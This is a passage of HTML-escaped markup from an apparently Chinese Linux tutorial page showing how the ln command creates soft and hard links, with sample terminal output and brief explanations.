			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# ll

-rw-r--r-- 1 root bin      61 11-13 06:03 log2013.log

[root@localhost test]# ln -s log2013.log link2013

[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 1 root bin      61 11-13 06:03 log2013.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39340629093017-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39340629093017-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39340629093017-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39340629093017-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39340629093017-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39340629093017-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39340629093017-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39340629093017-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39340629093017-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39340629093017-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39340629093017-11&quot;&gt;11&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39340629093017-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39340629093017-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39340629093017-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39340629093017-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39340629093017-5&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ln -s log2013.log link2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39340629093017-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39340629093017-7&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39340629093017-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39340629093017-9&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39340629093017-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39340629093017-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0021 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;为log2013.log文件创建软链接link2013，如果log2013.log丢失，link2013将失效&lt;/p&gt;
&lt;p&gt;实例2：给文件创建硬链接&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f39344022272051&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
ln log2013.log ln2013&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39344022272051-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39344022272051-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f39347534144477&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 1 root bin      61 11-13 06:03 log2013.log

[root@localhost test]# ln log2013.log ln2013

[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 2 root bin      61 11-13 06:03 ln2013

-rw-r--r-- 2 root bin      61 11-13 06:03 log2013.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39347534144477-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39347534144477-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39347534144477-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39347534144477-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39347534144477-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39347534144477-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39347534144477-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39347534144477-15&quot;&gt;15&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39347534144477-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-3&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39347534144477-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39347534144477-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-7&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ln log2013.log ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39347534144477-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-9&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39347534144477-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-11&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39347534144477-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39347534144477-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39347534144477-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0030 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
